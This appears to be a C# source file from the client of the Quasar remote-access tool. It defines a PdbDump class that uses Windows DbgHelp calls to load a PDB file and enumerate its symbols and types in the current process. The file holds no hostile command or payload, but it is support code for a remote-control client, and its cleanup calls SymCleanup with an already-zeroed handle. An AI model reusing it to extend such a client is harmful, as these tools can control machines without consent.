using Quasar.Client.Win32PE.Structs;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Quasar.Client.Win32PE.PE
{
    // mridgers/pdbdump.c
    // https://gist.github.com/mridgers/2968595
    public class PdbDump : IDisposable
    {
        IntPtr _hProcess = IntPtr.Zero;
        readonly string _pdbFilePath;
        readonly IntPtr _baseAddress;
        readonly int _memorySize;

        bool _symInitialized = false;

        public PdbDump(string pdbFilePath, IntPtr baseAddress, int memorySize)
        {
            var options = NativeMethods.SymGetOptions();

            options &= ~(uint)SymOpt.DEFERRED_LOADS;
            options |= (uint)SymOpt.LOAD_LINES;
            options |= (uint)SymOpt.IGNORE_NT_SYMPATH;
#if ENABLE_DEBUG_OUTPUT
            options |= (uint)SymOpt.SYMOPT_DEBUG;
#endif
            options |= (uint)SymOpt.UNDNAME;

            NativeMethods.SymSetOptions(options);

            var pid = Process.GetCurrentProcess().Id;
            var processHandle = NativeMethods.OpenProcess(ProcessAccessRights.PROCESS_QUERY_INFORMATION | ProcessAccessRights.PROCESS_VM_READ, false, pid);

            if (NativeMethods.SymInitialize(processHandle, null, false) == false)
                return;

            _symInitialized = true;

            _hProcess = processHandle;
            _pdbFilePath = pdbFilePath;
            _memorySize = memorySize;
            _baseAddress = LoadPdbModule(_hProcess, _pdbFilePath, baseAddress, (uint)_memorySize);
        }

        public static PdbStore CreateSymbolStore(string pdbFilePath, IntPtr baseAddress, int memorySize)
        {
            PdbStore store = null;

            using (var pdbDumper = new PdbDump(pdbFilePath, baseAddress, memorySize))
            {
                store = pdbDumper.GetStore((pStore) =>
                {
                    NativeMethods.SymEnumSymbols(pdbDumper._hProcess, (ulong)baseAddress.ToInt64(), "*", enum_proc, pStore);
                });
            }

            return store;
        }

        public static PdbStore CreateTypeStore(string pdbFilePath, IntPtr baseAddress, int memorySize)
        {
            PdbStore store = null;

            using (var pdbDumper = new PdbDump(pdbFilePath, baseAddress, memorySize))
            {
                store = pdbDumper.GetStore((pStore) =>
                {
                    NativeMethods.SymEnumTypes(pdbDumper._hProcess, (ulong)baseAddress.ToInt64(), enum_proc, pStore);
                });
            }

            return store;
        }

        public IEnumerable<SYMBOL_INFO> EnumerateTypes()
        {
            return Enumerate((pStore) =>
            {
                NativeMethods.SymEnumTypes(_hProcess, (ulong)_baseAddress.ToInt64(), enum_proc, pStore);
            });
        }

        public IEnumerable<SYMBOL_INFO> EnumerateSymbols()
        {
            return Enumerate((pStore) =>
            {
                NativeMethods.SymEnumSymbols(_hProcess, (ulong)_baseAddress.ToInt64(), "*", enum_proc, pStore);
            });
        }

        private IEnumerable<SYMBOL_INFO> Enumerate(Action<IntPtr> action)
        {
            var store = GetStore(action);
            foreach (var si in store.Enumerate())
            {
                yield return si;
            }
        }

        private PdbStore GetStore(Action<IntPtr> action)
        {
            var store = new PdbStore();

            var pStore = Marshal.AllocHGlobal(16); // 16 == sizeof(VARIANT)
            Marshal.GetNativeVariantForObject(store, pStore);

            action(pStore);

            return store;
        }

        private static unsafe bool enum_proc(IntPtr pinfo, uint size, IntPtr pUserContext)
        {
            var info = SYMBOL_INFO.Create(pinfo);

            var pdbStore = (PdbStore)Marshal.GetObjectForNativeVariant(pUserContext);
            pdbStore.Add(info);

            return true;
        }

        // It's possible even if processHandle is not real Handle. (For example processHandle == 0x493)
        // Also, base_addr and moduleSize can be arbitrary.
        // private static unsafe IntPtr LoadPdbModule(IntPtr processHandle, string pdbFilePath)
        // {
        //     IntPtr base_addr = new IntPtr(0x400000);
        //     return LoadPdbModule(processHandle, pdbFilePath, base_addr, 0x7fffffff);
        // }

        private static unsafe IntPtr LoadPdbModule(IntPtr processHandle, string pdbFilePath, IntPtr baseAddress, uint moduleSize)
        {
            return new IntPtr((long)NativeMethods.SymLoadModuleEx(processHandle,
                IntPtr.Zero, pdbFilePath, null, baseAddress.ToInt64(), moduleSize, null, 0));
        }

        bool _disposed = false;

        protected virtual void Dispose(bool disposing)
        {
            if (_disposed == false)
            {
                if (disposing == true)
                {
                    if (_hProcess != IntPtr.Zero)
                    {
                        NativeMethods.CloseHandle(_hProcess);
                        _hProcess = IntPtr.Zero;
                    }

                    if (_symInitialized == true)
                    {
                        NativeMethods.SymCleanup(_hProcess);
                        _symInitialized = false;
                    }
                }

                _disposed = true;
            }
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }
    }
}
